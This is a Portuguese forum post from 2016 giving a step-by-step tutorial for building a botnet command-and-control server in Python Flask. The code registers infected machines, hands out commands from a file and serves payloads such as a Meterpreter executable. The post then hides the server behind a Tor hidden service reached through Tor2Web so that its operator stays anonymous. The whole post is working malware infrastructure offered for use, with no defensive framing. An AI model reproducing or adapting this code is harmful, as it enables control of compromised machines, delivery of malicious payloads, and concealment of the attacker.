@@ -1,0 +1,109 @@
+
+
+Criando mini server para botnet com Python e Tor
+
+    Denunciar esta mensagem
+    Citação
+
+Mensagem02/Jan/2016, 15:21
+Quando criamos botnets, precisamos de um servidor para atualizar todos os
+botnets e mandar os respectivos comandos, muitas vezes isso é feito usando o
+IRC. Porém muitos anti-vírus estão de olho, e tomam cuidado em relação a
+conexões com chats IRC, além disso o protocolo IRC apesar de simples demanda
+tempo para ser implementado no botnet. Além disso linguagens já utilizadas hoje
+para se codificar malwares e botnets como VBScript possuem alguma implementação
+do protocolo HTTP, assim podemos utiliza-lo para controlar os botnets.
+
+Primeiro instale o Python (se você usa Linux já vem nativo), e então o pip, não
+ vou me aprofundar na instalação do Python e do pip, apenas da biblioteca
+ necessária. Com o Python e o pip instalado, instale o Flask:
+
+Código: Selecionar todos
+# pip install flask
+
+
+Com o Flask instalado podemos iniciar o código:
+
+Código: Selecionar todos
+from flask import Flask, request
+
+app = Flask(__name__)
+app.debug = False
+
+@app.route('/')
+def index():
+   return '<h1>There is nothing to see here</h1>'
+
+if __name__ == '__main__':
+   app.run()
+
+
+Inicializamos o framework, e criamos o index, não se deve utilizar o index para
+retornar nada, entenderemos mais a frente. Salve como server.py e execute:
+
+Código: Selecionar todos
+$ python server.py
+
+
+Deve aparecer a seguinte saída:
+
+Código: Selecionar todos
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+
+
+Agora iremos criar as outras funcionalidades do server, primeiramente iremos
+criar uma url de notificação, chamada running, para que assim que o botnet
+ iniciar, notificar o servidor que está rodando, enviando um ID, que pode ser
+ aleatório ou com alguma informação da máquina (o que pode ser interessante para
+  explorar a máquina), insira o código abaixo do index:
+
+
+Código: Selecionar todos
+@app.route('/running/<id>')
+def running(id):
+   print 'Novo botnet: %s, %s' % (id, request.headers['user-agent'])
+   return open('action.txt').read()
+
+
+Crie o arquivo action.txt, para determinar o que o botnet deve fazer em seguida
+ (baixar um arquivo, executar um comando, etc), assim você não precisa modificar
+  o fonte do server toda vez que precisar trocar a ação a ser feita.
+
+Agora com a url de notificação criada, vamos criar uma url para baixar um payload,
+ como um executável do meterpreter por exemplo:
+
+
+Código: Selecionar todos
+@app.route('/payload')
+def payload():
+   return open('payloadname.txt').read()
+
+
+Agora crie a pasta static, e coloque o payload dentro dela, e crie o arquivo
+ payloadname.txt com o nome do payload, como "/static/msf.exe" por exemplo.
+  Qualquer arquivo em static pode ser baixado automaticamente, por isso o
+  payload deve estar lá.
+
+
+Somente com isso já dá pra extender bastante o servidor, você pode criar um
+botnet em qualquer linguagem que tenha suporte a HTTPS (VBScript, Python, etc),
+ agora vamos iniciar um hidden service para usarmos o botnet com tor, crie uma
+ pasta de configuração como server-config, e rode o tor, como aqui eu uso uma
+ porta diferente você pode continuar com o tor aberto em outro lugar, o ideal
+ é que você crie um shell script ou um BAT para executar o comando:
+
+Código: Selecionar todos
+tor --SOCKSPort 9051 --HiddenServiceDir server-config --HiddenServicePort
+ "80 127.0.0.1:5000"
+
+
+Com o tor iniciado, você pode pegar o url .onion no arquivo hostname e verficar
+ no TBB.
+
+Com tudo funcional, configure seu botnet para acessar o host onion com .to no
+final, assim você não precisa que a máquina com o botnet tenha o tor, como por
+exemplo https://owriezc726nuc3fv.onion.to/, acessando o nó running para notificar
+o server. Assim usando o Tor com o Tor2Web (.to), você proteje seu server
+de algum espertinho querendo saber quem você é.
+
+Enjoy.
